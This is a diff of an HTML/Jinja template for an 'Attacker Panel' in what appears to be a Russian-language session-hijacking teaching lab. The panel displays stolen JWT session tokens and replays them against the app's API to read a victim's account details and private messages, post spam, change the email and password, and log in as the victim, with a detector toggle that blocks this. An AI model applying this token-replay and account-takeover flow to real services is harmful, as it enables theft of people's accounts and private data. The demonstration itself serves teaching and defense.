@@ -1,156 +1,188 @@
-{% extends "base.html" %}
-{% block title %}Attacker Panel — SessionLab{% endblock %}
-{% block content %}
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 — Attacker Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-.panel-header {
-  display: flex; align-items: flex-start; justify-content: space-between;
-  margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border);
-}
-.panel-title { font-family: var(--mono); font-size: 1.2rem; font-weight: 700; color: var(--red); }
-.panel-sub { font-size: 12px; color: var(--text3); margin-top: 0.3rem; }
-.stolen-grid { display: flex; flex-direction: column; gap: 1rem; }
-.stolen-card {
-  background: var(--bg2); border: 1px solid var(--border);
-  border-left: 3px solid var(--red); border-radius: 4px; padding: 1.4rem;
-}
-.stolen-card-header {
-  display: flex; justify-content: space-between; align-items: center;
-  margin-bottom: 1rem;
-}
-.stolen-id { font-family: var(--mono); font-size: 10px; color: var(--text3); }
-.stolen-time { font-family: var(--mono); font-size: 10px; color: var(--text3); }
-.stolen-meta {
-  display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;
-  margin-bottom: 1rem;
-}
-.meta-item { background: var(--bg3); border-radius: 2px; padding: 0.5rem 0.7rem; }
-.meta-label {
-  font-family: var(--mono); font-size: 9px; letter-spacing: 0.1em;
-  text-transform: uppercase; color: var(--text3); margin-bottom: 0.2rem;
-}
-.meta-value { font-family: var(--mono); font-size: 11px; color: var(--text2); word-break: break-all; }
-.token-preview {
-  background: var(--bg3); border: 1px solid var(--border2);
-  border-radius: 2px; padding: 0.6rem 0.8rem;
-  font-family: var(--mono); font-size: 10px; color: var(--text2);
-  word-break: break-all; line-height: 1.7; margin-bottom: 1rem;
-}
-.token-preview .th { color: #ff6b9d; }
-.token-preview .tp { color: #00d4ff; }
-.token-preview .ts_ { color: #00e676; }
-.token-preview .td { color: var(--text3); }
-.card-actions { display: flex; gap: 0.5rem; }
-.empty {
-  text-align: center; padding: 4rem;
-  font-family: var(--mono); font-size: 12px; color: var(--text3);
-  border: 1px dashed var(--border); border-radius: 4px;
-}
-.stats-row {
-  display: grid; grid-template-columns: repeat(3,1fr); gap: 1rem; margin-bottom: 2rem;
-}
-.stat-card {
-  background: var(--bg2); border: 1px solid var(--border);
-  border-radius: 4px; padding: 1rem 1.2rem;
-}
-.stat-num {
-  font-family: var(--mono); font-size: 1.8rem; font-weight: 700;
-  color: var(--red); line-height: 1;
-}
-.stat-lbl { font-size: 11px; color: var(--text3); margin-top: 0.3rem; }
-.edu-banner {
-  background: rgba(255,68,68,0.05); border: 1px solid rgba(255,68,68,0.15);
-  border-radius: 4px; padding: 0.8rem 1.2rem; margin-bottom: 2rem;
-  font-family: var(--mono); font-size: 11px; color: var(--text3); line-height: 1.6;
-}
-.edu-banner b { color: var(--red); }
+:root{--bg:#070809;--surf:#0e1013;--surf2:#13161a;--line:#1e2228;--text:#c4ccd4;--muted:#6b7680;--dim:#454e57;--red:#ff4444;--green:#00e676;--yellow:#ffcc00;--cyan:#00d4ff}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;min-height:100vh;font-size:13px}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);pointer-events:none;z-index:999}
+.bar{border-bottom:1px solid var(--line);padding:.9rem 1.5rem;display:flex;align-items:center;justify-content:space-between;background:var(--surf)}
+.brand{color:var(--red);font-weight:700;letter-spacing:.05em}
+.links a{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.08em;margin-left:1.2rem}
+.links a:hover{color:var(--cyan)}
+.wrap{max-width:1000px;margin:0 auto;padding:1.8rem 1.5rem}
+.head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:1.5rem;padding-bottom:1.2rem;border-bottom:1px solid var(--line)}
+.eyebrow{font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);margin-bottom:.4rem}
+.title{color:var(--red);font-size:1.2rem;font-weight:700}
+.sub{color:var(--muted);font-size:11px;margin-top:.2rem}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1.5rem}
+.stat{background:var(--surf);border:1px solid var(--line);border-radius:6px;padding:1rem}
+.stat .n{font-size:1.7rem;font-weight:700;color:var(--red);line-height:1}
+.stat .l{font-size:11px;color:var(--dim);margin-top:.3rem}
+
+/* protection toggle */
+.prot{background:var(--surf);border:1px solid var(--line);border-radius:6px;padding:1rem 1.2rem;margin-bottom:1.5rem;display:flex;align-items:center;justify-content:space-between}
+.prot-info .t{font-weight:500;margin-bottom:.2rem}
+.prot-info .d{font-size:11px;color:var(--muted)}
+.toggle{position:relative;width:54px;height:28px;border-radius:14px;background:var(--surf2);border:1px solid var(--line);cursor:pointer;transition:.2s;flex-shrink:0}
+.toggle.on{background:rgba(0,230,118,.2);border-color:var(--green)}
+.toggle .knob{position:absolute;top:2px;left:2px;width:22px;height:22px;border-radius:50%;background:var(--muted);transition:.2s}
+.toggle.on .knob{left:28px;background:var(--green)}
+
+.empty{text-align:center;padding:3rem;border:1px dashed var(--line);border-radius:8px;color:var(--dim)}
+.empty a{color:var(--cyan)}
+.tok{background:var(--surf);border:1px solid var(--line);border-left:3px solid var(--red);border-radius:6px;padding:1.2rem;margin-bottom:1rem}
+.tok-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:.9rem}
+.tok-id{font-size:10px;color:var(--dim);letter-spacing:.1em}
+.tok-time{font-size:10px;color:var(--dim)}
+.meta{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem;margin-bottom:.9rem}
+.m{background:var(--surf2);border-radius:4px;padding:.45rem .65rem}
+.m .ml{font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin-bottom:.15rem}
+.m .mv{font-size:11px;color:var(--text);word-break:break-all}
+.jwt{background:var(--surf2);border:1px solid var(--line);border-radius:4px;padding:.55rem .7rem;font-size:10px;word-break:break-all;line-height:1.7;margin-bottom:1rem}
+.jwt .h{color:#ff6b9d}.jwt .p{color:var(--cyan)}.jwt .s{color:var(--green)}.jwt .d{color:var(--dim)}
+
+.actions{display:flex;flex-wrap:wrap;gap:.5rem}
+.act{font-family:inherit;font-size:11px;font-weight:500;padding:.5rem .9rem;border:1px solid var(--line);background:var(--surf2);color:var(--text);border-radius:5px;cursor:pointer;transition:.15s}
+.act:hover{border-color:var(--cyan);color:var(--cyan)}
+.act.danger:hover{border-color:var(--red);color:var(--red)}
+.act.open{border-color:var(--red);color:var(--red)}
+.act.open:hover{background:var(--red);color:#fff}
+
+.out{margin-top:1rem;border-top:1px solid var(--line);padding-top:.9rem;display:none}
+.out.show{display:block}
+.line{font-size:11px;line-height:1.7;white-space:pre-wrap;word-break:break-word}
+.line.ok{color:var(--green)} .line.bad{color:var(--red)} .line.warn{color:var(--yellow)} .line.info{color:var(--muted)}
+.dmrow{padding:.4rem .6rem;background:var(--surf2);border-radius:4px;margin-top:.35rem;font-size:11px}
+.dmrow b{color:var(--cyan)}
 </style>
-
-<div class="edu-banner">
-  <b>// панель атакующего — учебная демонстрация</b><br>
-  Показывает украденные токены из /stealer страницы. В реальной атаке эта панель находится на сервере злоумышленника.
+</head>
+<body>
+<div class="bar">
+  <span class="brand">⚠ C2 // ATTACKER PANEL</span>
+  <span class="links"><a href="/logs">Detector logs</a><a href="/feed">Open PULSE</a></span>
 </div>
-
-<div class="panel-header">
-  <div>
-    <div class="tag">// command & control</div>
-    <div class="panel-title">⚠ Attacker Panel</div>
-    <div class="panel-sub">Украденные сессионные токены</div>
-  </div>
-  <a href="/logs" class="btn btn-muted">Логи детектора →</a>
-</div>
-
-<div class="stats-row">
-  <div class="stat-card">
-    <div class="stat-num">{{ stolen|length }}</div>
-    <div class="stat-lbl">украдено токенов</div>
-  </div>
-  <div class="stat-card">
-    <div class="stat-num">{{ victims }}</div>
-    <div class="stat-lbl">уникальных жертв</div>
-  </div>
-  <div class="stat-card">
-    <div class="stat-num">{{ active }}</div>
-    <div class="stat-lbl">активных токенов</div>
-  </div>
-</div>
-
-<div class="stolen-grid">
-{% if stolen %}
-  {% for s in stolen %}
-  <div class="stolen-card">
-    <div class="stolen-card-header">
-      <span class="stolen-id">STOLEN #{{ s.id }}</span>
-      <span class="stolen-time">{{ s.timestamp }}</span>
+<div class="wrap">
+  <div class="head">
+    <div>
+      <div class="eyebrow">command &amp; control</div>
+      <div class="title">Украденные сессии</div>
+      <div class="sub">Токены, собранные со страницы /stealer</div>
     </div>
-    <div class="stolen-meta">
-      <div class="meta-item">
-        <div class="meta-label">User-Agent</div>
-        <div class="meta-value">{{ s.useragent[:50] if s.useragent else '—' }}</div>
-      </div>
-      <div class="meta-item">
-        <div class="meta-label">URL жертвы</div>
-        <div class="meta-value">{{ s.url[:40] if s.url else '—' }}</div>
-      </div>
-      <div class="meta-item">
-        <div class="meta-label">Экран</div>
-        <div class="meta-value">{{ s.screen or '—' }}</div>
-      </div>
-      <div class="meta-item">
-        <div class="meta-label">Язык</div>
-        <div class="meta-value">{{ s.language or '—' }}</div>
-      </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><div class="n">{{ stolen|length }}</div><div class="l">перехвачено</div></div>
+    <div class="stat"><div class="n">{{ victims }}</div><div class="l">устройств-жертв</div></div>
+    <div class="stat"><div class="n">{{ active }}</div><div class="l">валидных токенов</div></div>
+  </div>
+
+  <div class="prot">
+    <div class="prot-info">
+      <div class="t">Детектор аномалий</div>
+      <div class="d" id="protDesc">{% if protection %}ВКЛ — аномальные действия блокируются{% else %}ВЫКЛ — атакующий действует свободно{% endif %}</div>
     </div>
-    {% if s.token %}
-    <div class="token-preview" id="token-{{ s.id }}">
+    <div class="toggle {% if protection %}on{% endif %}" id="toggle" onclick="toggleProt()"><div class="knob"></div></div>
+  </div>
+
+  {% if stolen %}
+    {% for s in stolen %}
+    <div class="tok">
+      <div class="tok-head"><span class="tok-id">SESSION #{{ s.id }}</span><span class="tok-time">{{ s.ts }}</span></div>
+      <div class="meta">
+        <div class="m"><div class="ml">User-Agent</div><div class="mv">{{ s.useragent[:48] if s.useragent else '—' }}</div></div>
+        <div class="m"><div class="ml">Источник</div><div class="mv">{{ s.url[:42] if s.url else '—' }}</div></div>
+        <div class="m"><div class="ml">Экран</div><div class="mv">{{ s.screen or '—' }}</div></div>
+        <div class="m"><div class="ml">Язык</div><div class="mv">{{ s.language or '—' }}</div></div>
+      </div>
+      {% if s.token %}
       {% set parts = s.token.split('.') %}
-      <span class="th">{{ parts[0] }}</span><span class="td">.</span><span class="tp">{{ parts[1] if parts|length > 1 else '' }}</span><span class="td">.</span><span class="ts_">{{ parts[2] if parts|length > 2 else '' }}</span>
+      <div class="jwt"><span class="h">{{ parts[0] }}</span><span class="d">.</span><span class="p">{{ parts[1] if parts|length>1 }}</span><span class="d">.</span><span class="s">{{ parts[2] if parts|length>2 }}</span></div>
+      <div class="actions">
+        <button class="act" onclick="act(this,'{{ s.token }}','/api/account','Данные аккаунта')">👤 Данные аккаунта</button>
+        <button class="act" onclick="act(this,'{{ s.token }}','/api/read-messages','Личные сообщения')">✉ Читать сообщения</button>
+        <button class="act danger" onclick="act(this,'{{ s.token }}','/api/post-spam','Спам')">📢 Спам от имени</button>
+        <button class="act danger" onclick="act(this,'{{ s.token }}','/api/change-email','Смена email')">✏ Захват: сменить email</button>
+        <button class="act danger" onclick="act(this,'{{ s.token }}','/api/change-password','Смена пароля')">🔒 Заблокировать вход</button>
+        <button class="act open" onclick="openAs('{{ s.token }}')">↗ Войти как жертва</button>
+      </div>
+      <div class="out" id="out-{{ s.id }}"></div>
+      {% else %}
+      <div class="line bad">Токен не извлечён — cookie был защищён HttpOnly</div>
+      {% endif %}
     </div>
-    <div class="card-actions">
-      <button class="btn" onclick="useToken('{{ s.token }}')">Использовать токен →</button>
-      <button class="btn btn-muted" onclick="copyToken('{{ s.token }}')">Копировать</button>
-    </div>
-    {% else %}
-    <div style="font-family:var(--mono);font-size:11px;color:var(--text3)">
-      Токен не найден в cookies (HttpOnly защита сработала)
-    </div>
-    {% endif %}
-  </div>
-  {% endfor %}
-{% else %}
-  <div class="empty">
-    Украденных токенов нет<br><br>
-    Отправь жертву на <a href="/stealer">/stealer</a> страницу
-  </div>
-{% endif %}
+    {% endfor %}
+  {% else %}
+    <div class="empty">Сессий пока нет.<br><br>Отправь жертву на <a href="/stealer">/stealer</a>, чтобы перехватить токен.</div>
+  {% endif %}
 </div>
 
 <script>
-function useToken(token) {
-  document.cookie = 'token=' + token + '; path=/';
-  window.location.href = '/dashboard';
+let protection = {{ 'true' if protection else 'false' }};
+
+async function toggleProt(){
+  const r = await fetch('/toggle-protection',{method:'POST'});
+  const d = await r.json();
+  protection = d.protection;
+  document.getElementById('toggle').classList.toggle('on',protection);
+  document.getElementById('protDesc').textContent = protection
+    ? 'ВКЛ — аномальные действия блокируются'
+    : 'ВЫКЛ — атакующий действует свободно';
 }
-function copyToken(token) {
-  navigator.clipboard.writeText(token).then(() => alert('Токен скопирован'));
+
+function findOut(btn){ return btn.closest('.tok').querySelector('.out'); }
+
+async function act(btn,token,url,label){
+  const out=findOut(btn); out.classList.add('show');
+  out.innerHTML='<div class="line info">→ '+label+': отправка запроса с украденным токеном…</div>';
+  try{
+    const r=await fetch(url,{method:'POST',headers:{'X-Session-Token':token}});
+    const d=await r.json();
+    if(d.blocked){
+      out.innerHTML='<div class="line bad">⛔ ЗАБЛОКИРОВАНО детектором</div>'+
+        '<div class="line warn">флаги: '+d.detector.flags.join(', ')+' · risk '+d.detector.risk+'/100</div>'+
+        '<div class="line info">с включённой защитой украденный токен бесполезен</div>';
+      return;
+    }
+    if(!d.ok){ out.innerHTML='<div class="line bad">✗ '+(d.error||'ошибка')+'</div>'; return; }
+    render(out,url,d);
+  }catch(e){ out.innerHTML='<div class="line bad">✗ сетевая ошибка</div>'; }
+}
+
+function render(out,url,d){
+  if(url.includes('account')){
+    const a=d.account;
+    out.innerHTML='<div class="line ok">✓ доступ к личным данным получен</div>'+
+      '<div class="dmrow">Имя: <b>'+a.display_name+'</b></div>'+
+      '<div class="dmrow">Email: <b>'+a.email+'</b></div>'+
+      '<div class="dmrow">Телефон: <b>'+a.phone+'</b></div>';
+  }else if(url.includes('read-messages')){
+    let h='<div class="line ok">✓ перехвачено '+d.messages.length+' личных сообщений</div>';
+    d.messages.forEach(m=>h+='<div class="dmrow"><b>'+m.sender+':</b> '+m.content+'</div>');
+    out.innerHTML=h;
+  }else if(url.includes('change-email')){
+    out.innerHTML='<div class="line bad">✓ '+d.message+'</div>'+
+      '<div class="dmrow">новый email: <b>'+d.new_email+'</b></div>'+
+      '<div class="line warn">проверь /settings жертвы — email изменён</div>';
+  }else if(url.includes('change-password')){
+    out.innerHTML='<div class="line bad">✓ '+d.message+'</div>'+
+      '<div class="line warn">жертва больше не сможет войти своим паролем</div>';
+  }else if(url.includes('post-spam')){
+    out.innerHTML='<div class="line bad">✓ '+d.message+'</div>'+
+      '<div class="dmrow">'+d.post+'</div>'+
+      '<div class="line warn">пост виден всем в ленте жертвы</div>';
+  }
+}
+
+function openAs(token){
+  document.cookie='token='+token+';path=/';
+  document.cookie='demo_token='+token+';path=/';
+  location.href='/feed';
 }
 </script>
-{% endblock %}
+</body>
+</html>
